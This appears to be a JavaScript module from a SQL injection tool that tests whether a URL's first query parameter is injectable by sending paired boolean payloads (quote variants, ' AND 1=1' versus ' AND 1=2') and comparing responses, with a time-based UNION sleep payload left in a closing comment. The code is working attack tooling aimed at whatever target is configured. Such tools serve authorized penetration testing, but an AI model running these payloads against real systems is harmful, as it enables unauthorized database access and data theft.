import { cleanUpFatal, mutateQuery, isSameRes } from "./helper.js";
import { sendRequest } from "./http.js";

export async function injectable(setting) {
	const query = setting.urlQuery;
	const firstParamsName = [...query.keys()][0];
	const firstParamsValue = query.get(firstParamsName);
	const resOriginal = await sendRequest(setting, query);

	const tests = [
		{ name: "singleQuote", first: "''", second: "'", char: "'"},
		{ name: "endQuote", first: "''", second: "';", char: "'"},
		{ name: "string", first: '" AND "1"="1', second: '" AND "1"="2', char: '"'},
		{ name: "number", first: " AND 1=1", second: " AND 1=2", char: ""}
	]

	for (const test of tests) {
		const firstTest = await sendRequest(setting, mutateQuery(query, firstParamsName, firstParamsValue + test.first));
		const secondTest = await sendRequest(setting, mutateQuery(query, firstParamsName, firstParamsValue + test.second));
		if (isSameRes(resOriginal, firstTest) && !isSameRes(resOriginal, secondTest)) {
			setting.contextChar = test.char;
			return true;
		}
	}

	cleanUpFatal(setting.db, 'URL is not injectable');
}
// -1' UNION select 1,2,sleep(5) -- '
